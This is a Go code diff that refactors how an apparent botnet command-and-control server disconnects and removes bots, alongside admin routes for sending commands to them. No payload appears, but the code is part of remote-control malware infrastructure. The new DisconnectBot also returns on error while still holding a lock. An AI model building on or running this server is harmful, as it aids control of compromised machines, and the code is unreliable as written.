@@ -100,18 +100,7 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 
 func (c *c2) listentoBot(bot *Bot) {
 	defer func() {
-		bot.mu.Lock()
-		bot.Active = false
-
-		if bot.con != nil {
-			bot.con.Close(websocket.StatusNormalClosure, "Closing the connection for the bot: "+strconv.Itoa(bot.ID)+bot.OS)
-		}
-		bot.mu.Unlock()
-
-		c.mu.Lock()
-		delete(c.bots, bot.ID)
-		c.mu.Unlock()
-
+		c.DisconnectBot(bot.ID)
 		log.Println("Deleted the Bot: ", bot.ID, "From the global bot list")
 
 	}()
@@ -159,19 +148,28 @@ func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
 	log.Println("List of bots send to dashboard.")
 }
 
-func (c *c2) DisconnectBot(w http.ResponseWriter, r *http.Request) {
-	botID, err := strconv.Atoi(r.PathValue("botid"))
-	if err != nil {
-		log.Println("Error converting botid type string to int", err)
-		return
-	}
+func (c *c2) DisconnectBot(botID int) bool {
+	exist := true
 	bot := c.getBot(botID)
 
 	if bot == nil {
+		exist = false
 		log.Println("Bot with id: ", botID, "Dosent Exist")
-		return
+		return exist
 	}
 
+	bot.mu.Lock()
+	if err := bot.con.Close(websocket.StatusNormalClosure, "Bot Disconnected"); err != nil {
+		log.Println("Error closing connection : ", err)
+		exist = false
+		return exist
+	}
+	bot.mu.Unlock()
+	c.mu.Lock()
+	delete(c.bots, botID)
+	c.mu.Unlock()
+
+	return exist
 }
 
 func main() {
@@ -181,7 +179,18 @@ func main() {
 	adminMux := http.NewServeMux()
 	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
 	adminMux.HandleFunc("/listBots", c2.ListBots)
-	adminMux.HandleFunc("/disconnect/{botid}/", c2.DisconnectBot)
+	adminMux.HandleFunc("/disconnect/{botid}/", func(w http.ResponseWriter, r *http.Request) {
+		botID, err := strconv.Atoi(r.PathValue("botid"))
+		if err != nil {
+			log.Println("Error converting botid type string to int", err)
+			return
+		}
+
+		if exist := c2.DisconnectBot(botID); !exist {
+			log.Println("Bot with id : ", botID, " Does not exist.")
+			return
+		}
+	})
 
 	botMux := http.NewServeMux()
 	botMux.HandleFunc("/connect", c2.connectBot)
